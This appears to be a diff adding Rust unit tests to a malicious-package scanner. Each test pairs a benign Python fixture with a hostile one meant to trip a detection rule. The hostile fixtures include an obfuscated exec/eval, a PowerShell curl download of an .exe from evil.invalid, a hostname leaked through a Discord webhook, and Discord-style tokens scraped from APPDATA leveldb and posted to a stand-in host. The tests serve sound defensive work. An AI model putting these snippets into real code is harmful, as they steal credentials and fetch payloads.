@@ -586,4 +586,96 @@ mod tests {
         assert!(ids.contains(&"PHX-OBF-001") && ids.contains(&"PHX-EXF-001"));
         assert!(RuleId::parse(ids[0]).is_ok());
     }
+
+    // ── ADR-028: misses found by the test-set error analysis, each a twin pair ──────────
+
+    fn rules_d(files: &[(&str, &str)]) -> Vec<String> {
+        let g = graph(files);
+        evaluate(&g, &ScanOptions::default())
+            .unwrap()
+            .iter()
+            .map(|f| f.rule.as_str().to_owned())
+            .collect()
+    }
+
+    // RULES.md lists `chr`-join under OBF-001; `chr` over constants was never a decoder.
+    // Twin: the same decoded string printed instead of executed.
+    #[test]
+    fn chr_join_over_constants_executed_fires_obf_001() {
+        let bad = "x = ''.join(chr(i) for i in [112, 114, 105, 110, 116])\nexec(x)\n";
+        let good = "x = ''.join(chr(i) for i in [112, 114, 105, 110, 116])\nprint(x)\n";
+        assert!(rules_d(&[("pkg/__init__.py", bad)]).contains(&"PHX-OBF-001".to_owned()));
+        assert!(!rules_d(&[("pkg/__init__.py", good)]).contains(&"PHX-OBF-001".to_owned()));
+    }
+
+    // A literal spelled in escape sequences is encoded by the lexer instead of by `base64`
+    // (BlankOBF: `eval("\145\166\141\154")`). Twin: an ANSI colour code, one escape.
+    #[test]
+    fn escape_encoded_literal_executed_fires_obf_001() {
+        let bad = r#"f = eval("\145\166\x61\x6c")
+f("print(1)")
+"#;
+        let good = r#"print("\x1b[31m" + "red")
+eval("1 + 1")
+"#;
+        assert!(rules_d(&[("pkg/__init__.py", bad)]).contains(&"PHX-OBF-001".to_owned()));
+        assert!(!rules_d(&[("pkg/__init__.py", good)]).contains(&"PHX-OBF-001".to_owned()));
+    }
+
+    // DRP-003, "raw endpoint executed": the URL sits inside the command, not alone.
+    // Twin: the same command shape with no endpoint in it.
+    #[test]
+    fn url_inside_an_executed_command_fires_drp_003() {
+        let bad = "import subprocess\nsubprocess.run(['powershell', '-Command', 'curl.exe -L https://evil.invalid/a.exe -o x.exe'])\n";
+        let good = "import subprocess\nsubprocess.run(['powershell', '-Command', 'Get-ChildItem -Path . -Recurse'])\nprint('docs: https://example.invalid/help')\n";
+        assert!(rules_d(&[("pkg/__init__.py", bad)]).contains(&"PHX-DRP-003".to_owned()));
+        assert!(!rules_d(&[("pkg/__init__.py", good)]).contains(&"PHX-DRP-003".to_owned()));
+    }
+
+    // An f-string's fixed text is a literal too; only its `{…}` parts are not.
+    #[test]
+    fn url_inside_an_executed_f_string_fires_drp_003() {
+        let bad = "import subprocess\nout = 'x.exe'\nsubprocess.run(['powershell', '-Command', f'curl.exe -L https://evil.invalid/a.exe -o \"{out}\"'])\n";
+        let good = "import subprocess\nout = 'x.exe'\nsubprocess.run(['powershell', '-Command', f'Remove-Item \"{out}\"'])\n";
+        assert!(rules_d(&[("pkg/__init__.py", bad)]).contains(&"PHX-DRP-003".to_owned()));
+        assert!(!rules_d(&[("pkg/__init__.py", good)]).contains(&"PHX-DRP-003".to_owned()));
+    }
+
+    // Messenger webhooks are network egress. Twin: the webhook posts a constant.
+    #[test]
+    fn identity_sent_through_a_discord_webhook_fires_exf_003() {
+        let bad = "import socket\nfrom discord import SyncWebhook\nhost = socket.gethostname()\nw = SyncWebhook.from_url('https://discord.invalid/api/webhooks/1/x')\nw.send(content=f'{host}')\n";
+        let good = "import socket\nfrom discord import SyncWebhook\nhost = socket.gethostname()\nw = SyncWebhook.from_url('https://discord.invalid/api/webhooks/1/x')\nw.send(content='build finished')\n";
+        assert!(rules_d(&[("pkg/__init__.py", bad)]).contains(&"PHX-EXF-003".to_owned()));
+        assert!(!rules_d(&[("pkg/__init__.py", good)]).contains(&"PHX-EXF-003".to_owned()));
+    }
+
+    // Stealers regex-extract tokens from what they read; a match is part of its input.
+    // Twin: the regex runs over a constant, the file content is never sent.
+    #[test]
+    fn a_secret_extracted_by_regex_is_still_exfiltrated() {
+        let bad = "import os, re, requests\np = os.getenv('APPDATA') + '/x/leveldb/000003.log'\nfor t in re.findall(r'[A-Za-z0-9-]{24}[.][A-Za-z0-9-]{6}', open(p).read()):\n    requests.post('https://c.invalid/', data=t)\n";
+        let good = "import os, re, requests\np = os.getenv('APPDATA') + '/x/leveldb/000003.log'\nopen(p).read()\nfor t in re.findall(r'[a-z]+', 'static text'):\n    requests.post('https://c.invalid/', data=t)\n";
+        assert!(rules_d(&[("pkg/__init__.py", bad)]).contains(&"PHX-EXF-001".to_owned()));
+        assert!(!rules_d(&[("pkg/__init__.py", good)]).contains(&"PHX-EXF-001".to_owned()));
+    }
+
+    // A list built by appending carries what was appended (ADR-028). Twin: the same list
+    // built from constants, sent after the secret was read and dropped.
+    #[test]
+    fn a_secret_collected_into_a_list_is_still_exfiltrated() {
+        let bad = "import os, requests
+found = []
+found.append(os.environ['TOKEN'])
+requests.post('https://c.invalid/', data=','.join(found))
+";
+        let good = "import os, requests
+found = []
+os.environ['TOKEN']
+found.append('static')
+requests.post('https://c.invalid/', data=','.join(found))
+";
+        assert!(rules_d(&[("pkg/__init__.py", bad)]).contains(&"PHX-EXF-001".to_owned()));
+        assert!(!rules_d(&[("pkg/__init__.py", good)]).contains(&"PHX-EXF-001".to_owned()));
+    }
 }
